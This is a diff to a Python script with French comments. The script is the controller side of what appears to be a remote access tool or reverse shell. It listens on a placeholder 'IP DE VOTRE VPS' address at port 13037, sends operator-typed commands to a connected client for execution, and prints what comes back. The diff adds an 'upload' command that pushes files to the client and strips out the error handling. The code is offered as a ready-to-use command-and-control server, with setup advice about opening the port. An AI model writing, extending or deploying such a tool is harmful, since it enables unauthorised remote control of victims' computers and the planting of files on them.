@@ -1,6 +1,23 @@
 import socket
 import os
-import keyboard # Module a installer
+
+def send_file(conn, file_path):
+    if os.path.exists(file_path):
+        conn.sendall(b'upload')
+        file_name = os.path.basename(file_path)
+        conn.sendall(file_name.encode('utf-8') + b'\n')
+        
+        with open(file_path, 'rb') as f:
+            while True:
+                chunk = f.read(1024)
+                if len(chunk) == 0:
+                    break
+                conn.sendall(chunk)
+        conn.sendall(b'EOF')
+        print(f"Fichier {file_path} envoyé.")
+    else:
+        conn.sendall(b'FileNotFound')
+        print("Fichier introuvable.")
 
 def get_user_and_computer_names():
     nom_user = os.getlogin() if os.name == 'posix' else os.environ.get('USERNAME') or "Admin"
@@ -24,15 +41,14 @@ def prompt():
     return input(" ")
 
 def start_server():
-    HOST = 'IP DU VPS'
-    PORT = 13037 # Vous pouvez changer le port
+    HOST = 'IP DE VOTRE VPS'
+    PORT = 13037 #Port vous pouvez le changer mais n'oubliez de l'ouvrir sur votre VPS en TCP
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         s.listen()
 
         print(f'Le serveur écoute sur {HOST}:{PORT}')
-        ctrl_pressed = False
 
         while True:
             conn, addr = s.accept()
@@ -40,28 +56,23 @@ def start_server():
                 print(f'Connecté par {addr}')
 
                 while True:
-                    if keyboard.is_pressed('ctrl'):
-                        ctrl_pressed = True
-                    else:
-                        if ctrl_pressed:
-                            print("CTRL+X détecté. Fermeture du programme.")
-                            return
-
                     command = prompt().strip()
 
                     if not command:
                         continue
 
+                    if command.startswith("upload"):
+                        _, file_path = command.split(maxsplit=1)
+                        send_file(conn, file_path)
+                        continue
+
                     conn.sendall(command.encode("utf-8"))
 
-                    try:
-                        output = conn.recv(4096).decode("utf-8")
-                        if output:
-                            print(f'Sortie de la commande :\n{output}')
-                        else:
-                            print('Aucune sortie ou client déconnecté.')
-                    except:
-                        print('Erreur lors de la réception de la sortie du client.')
+                    output = conn.recv(4096).decode("utf-8")
+                    if output:
+                        print(f'Sortie de la commande :\n{output}')
+                    else:
+                        print('Aucune sortie ou client déconnecté.')
 
 if __name__ == "__main__":
     start_server()
